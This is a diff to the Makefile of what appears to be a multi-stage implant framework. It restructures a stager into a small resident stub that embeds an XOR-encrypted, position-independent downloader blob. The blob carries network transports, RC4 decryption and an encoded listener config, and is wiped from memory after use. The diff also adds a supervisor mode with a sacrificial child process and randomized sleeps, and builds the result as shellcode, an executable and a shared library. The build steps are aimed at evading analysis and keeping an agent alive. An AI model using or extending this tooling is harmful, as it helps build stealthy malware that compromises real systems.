@@ -8,12 +8,25 @@ ifdef DEBUG
 	COMMON_CFLAGS += -DDEBUG
 endif
 
+# Optional lifecycle supervision: run the agent PIC in a sacrificial child
+# process and cache its ephemeral identity key across restarts.
+SUPERVISE ?= 0
+ifeq ($(SUPERVISE),1)
+	COMMON_CFLAGS += -DSUPERVISE=1
+endif
+SUPERVISE_SLEEP_MIN ?= 5
+SUPERVISE_SLEEP_MAX ?= 30
+COMMON_CFLAGS += -DSUPERVISE_SLEEP_MIN=$(SUPERVISE_SLEEP_MIN) -DSUPERVISE_SLEEP_MAX=$(SUPERVISE_SLEEP_MAX)
+
 # Common linker flags
 LDFLAGS_COMMON = -static -Wl,--gc-sections -Wl,-N -Wl,--build-id=none
 
 # Specific linker flags
 STAGE0_LDFLAGS = $(LDFLAGS_COMMON) -Wl,-Ttext-segment=0x10000000
 STAGE1_LDFLAGS = $(LDFLAGS_COMMON) -Wl,-Ttext-segment=0x0
+# The downloader is a position-independent blob mapped at an arbitrary address
+# by the stub, so it links as its own stage at virtual address 0.
+DL_LDFLAGS = $(STAGE1_LDFLAGS)
 
 # Default configuration (can be overridden by environment variables)
 DOWNLOAD_HOST ?= 127.0.0.1
@@ -96,14 +109,26 @@ COMMON_CFLAGS += -DCONFIG_XOR_KEY=$(XOR_KEY_VALUE)
 SOCKET_TRANSPORTS := http tcp udp libssl
 DYNLOAD_TRANSPORTS := libcurl libssl
 
-STAGE0_SRCS = downloader.c utils_min.c packer.c ../common/rc4.c debug.c syscalls.c
+# Downloader stage: a separate PIC blob (its own virtual-address space at 0)
+# that the stub maps, runs, then zeroes and unmaps. It holds the transports,
+# decryption and the encoded listener config, none of which must survive into
+# the supervising phase.
+DL_SRCS = downloader.c utils_min.c packer.c ../common/rc4.c debug.c syscalls.c
 ifneq ($(filter $(TRANSPORT),$(SOCKET_TRANSPORTS)),)
-  STAGE0_SRCS += net_utils.c
+  DL_SRCS += net_utils.c
 endif
 ifneq ($(filter $(TRANSPORT),$(DYNLOAD_TRANSPORTS)),)
-  STAGE0_SRCS += dynload.c
+  DL_SRCS += dynload.c
 endif
-STAGE0_SRCS += $(TRANSPORT_SRC)
+DL_SRCS += $(TRANSPORT_SRC)
+
+DL_TARGET = downloader
+DL_BIN = downloader.bin
+DL_BLOB_H = downloader_blob.h
+
+# Stub stage: the tiny resident entry point that embeds the downloader blob and
+# owns the agent lifecycle (including the supervisor).
+STUB_SRCS = stub.c utils_min.c debug.c syscalls.c
 
 STAGE0_TARGET = stager
 SHELLCODE = stager.bin
@@ -140,16 +165,36 @@ $(SHELLCODE): $(STAGE0_TARGET)
 # 2. ELF Executable (stager)
 executable: $(STAGE0_TARGET)
 
-$(STAGE0_TARGET): $(STAGE0_SRCS)
-	$(CC) $(COMMON_CFLAGS) $(STAGE0_LDFLAGS) -o $@ $(STAGE0_SRCS)
+# Downloader blob: flat PIC binary + XOR-encrypted embedding header.
+$(DL_TARGET): $(DL_SRCS)
+	$(CC) $(COMMON_CFLAGS) $(DL_LDFLAGS) -o $@ $(DL_SRCS)
+
+$(DL_BIN): $(DL_TARGET)
+	strip --strip-all --strip-debug --strip-unneeded -R .comment -R .note -R .note.gnu.build-id $(DL_TARGET)
+	objcopy -O binary -j .init -j .text -j .rodata -j .data $(DL_TARGET) $@
+
+$(DL_BLOB_H): $(DL_BIN)
+	@python3 -c "import random; \
+	key = [random.randint(0, 255) for _ in range(16)]; \
+	data = open('$(DL_BIN)', 'rb').read(); \
+	enc = bytes(b ^ key[i % 16] for i, b in enumerate(data)); \
+	print('#ifndef DOWNLOADER_BLOB_H'); \
+	print('#define DOWNLOADER_BLOB_H'); \
+	print('static const unsigned char downloader_key[] = { ' + ', '.join(hex(b) for b in key) + ' };'); \
+	print('static const unsigned int downloader_bin_len = ' + str(len(data)) + ';'); \
+	print('static const unsigned char downloader_bin[] = { ' + ', '.join(hex(b) for b in enc) + ' };'); \
+	print('#endif')" > $@
+
+$(STAGE0_TARGET): $(STUB_SRCS) $(DL_BLOB_H)
+	$(CC) $(COMMON_CFLAGS) $(STAGE0_LDFLAGS) -o $@ $(STUB_SRCS)
 	@echo "[+] Exported symbols in $(STAGE0_TARGET):"
 	@nm $@ 2>/dev/null | grep ' [T|g] ' || readelf -W -s $@ 2>/dev/null | grep ' FUNC ' || true
 
 # 3. Shared Library (.so)
 so: $(SHARED_LIB)
 
-$(SHARED_LIB): $(STAGE0_SRCS)
-	$(CC) $(COMMON_CFLAGS) -shared $(STAGE0_LDFLAGS) -o $@ $(STAGE0_SRCS)
+$(SHARED_LIB): $(STUB_SRCS) $(DL_BLOB_H)
+	$(CC) $(COMMON_CFLAGS) -shared $(STAGE0_LDFLAGS) -o $@ $(STUB_SRCS)
 	@echo "Shared library generated at $(PWD)/$@"
 	@echo "[+] Exported symbols in $(SHARED_LIB):"
 	@nm -D $@ 2>/dev/null | grep ' [T|g] ' || nm $@ 2>/dev/null | grep ' [T|g] ' || readelf -W -s $@ 2>/dev/null | grep ' FUNC ' || true
